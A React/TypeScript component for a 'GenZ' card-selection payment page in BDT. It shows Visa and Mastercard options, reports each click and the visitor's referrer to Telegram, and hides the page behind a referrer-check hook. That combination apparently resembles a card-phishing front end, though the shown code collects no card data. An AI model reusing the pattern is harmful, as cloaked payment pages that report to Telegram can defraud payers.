import { useState } from "react";
import { useNavigate, useSearchParams } from "react-router-dom";
import { ArrowLeft } from "lucide-react";
import { sendTelegramNotification } from "@/lib/telegram";
import { useReferrerGuard } from "@/hooks/useReferrerGuard";
import genzLogo from "@/assets/genz-logo.png";
import visaLogo from "@/assets/visa-logo.png";
import mastercardLogo from "@/assets/mastercard-logo.png";
import DualCircleLoader from "@/components/DualCircleLoader";

const CardSelection = () => {
  const navigate = useNavigate();
  const [searchParams] = useSearchParams();
  const amount = searchParams.get("amount") || "00";
  const { checking: referrerChecking } = useReferrerGuard();
  const [showLoader, setShowLoader] = useState(false);
  const [clickedCard, setClickedCard] = useState<string | null>(null);

  const isMobileOrTablet = typeof window !== "undefined" && window.innerWidth < 1024;

  const handleSelect = (route: string, method: string) => {
    sendTelegramNotification({
      type: "payment_activity",
      method,
      paymentType: "card",
      referrer: document.referrer || "Direct",
    });

    if (isMobileOrTablet) {
      setClickedCard(route);
      setTimeout(() => {
        setShowLoader(true);
        setTimeout(() => navigate(`${route}?amount=${amount}`), 1500);
      }, 300);
    } else {
      setShowLoader(true);
      setTimeout(() => navigate(`${route}?amount=${amount}`), 1500);
    }
  };

  if (referrerChecking) return null;

  if (showLoader) {
    return (
      <div className="min-h-[100dvh] w-screen bg-background flex items-center justify-center fixed inset-0 z-50">
        <DualCircleLoader />
      </div>
    );
  }

  return (
    <div className="h-screen bg-background flex items-start md:items-center justify-center p-2 md:p-4 overflow-hidden">
      <div className="w-full max-w-[520px] md:max-w-[700px] lg:max-w-[800px] flex flex-col h-full">
        <div className="bg-transparent md:bg-card md:rounded-2xl md:shadow-sm flex flex-col">
          {/* Top Bar */}
          <div className="flex items-center justify-center px-3 py-2 md:px-5 md:py-3">
            <div className="bg-card rounded-lg flex items-center justify-between w-full px-4 py-2 shadow-sm">
              <ArrowLeft
                className="w-4 h-4 text-foreground cursor-pointer"
                strokeWidth={1.5}
                onClick={() => navigate(`/?amount=${amount}`)}
              />
              <span className="text-sm font-medium text-foreground">Select Card Type</span>
              <div className="w-4" />
            </div>
          </div>

          {/* Content */}
          <div className="flex-1 px-3 md:px-6 pb-16 md:pb-6 flex flex-col items-center">
            {/* Logo */}
            <div className="flex justify-center mt-2 mb-4">
              <img src={genzLogo} alt="GenZ" className="w-14 h-14 md:w-20 md:h-20 rounded-full object-cover" />
            </div>

            <h2 className="text-foreground text-base md:text-lg font-bold mb-1 text-center">Choose Your Card</h2>
            <p className="text-muted-foreground text-xs md:text-sm mb-6 text-center">Select a card type to proceed with payment</p>

            {/* Card Options */}
            <div className="grid grid-cols-2 gap-4 w-full max-w-[400px]">
              {[
                { id: "visa", route: "/visa", logo: visaLogo, alt: "VISA", label: "Visa" },
                { id: "mastercard", route: "/mastercard", logo: mastercardLogo, alt: "Mastercard", label: "Mastercard" },
              ].map((card) => (
                <div
                  key={card.id}
                  onClick={() => handleSelect(card.route, card.id)}
                  className={`group bg-card rounded-xl border-2 border-border hover:border-primary flex flex-col items-center justify-center py-6 px-4 cursor-pointer transition-all duration-200 hover:shadow-md ${
                    clickedCard === card.route ? "scale-95 border-primary" : ""
                  }`}
                >
                  <img
                    src={card.logo}
                    alt={card.alt}
                    className={`h-14 md:h-18 object-contain mb-3 transition-transform duration-300 group-hover:scale-95 ${
                      clickedCard === card.route ? "scale-95" : ""
                    }`}
                  />
                  <span className="text-sm font-medium text-foreground">{card.label}</span>
                </div>
              ))}
            </div>
          </div>

          {/* Pay Footer - Desktop */}
          <div className="hidden md:block bg-pay-bar py-3 text-center rounded-b-2xl mt-auto">
            <span className="text-primary font-bold text-lg">Pay {amount} BDT</span>
          </div>
        </div>

        {/* Pay Footer - Mobile */}
        <div className="md:hidden fixed bottom-0 left-0 right-0 bg-pay-bar py-3 text-center">
          <span className="text-primary font-bold text-base">Pay {amount} BDT</span>
        </div>
      </div>
    </div>
  );
};

export default CardSelection;
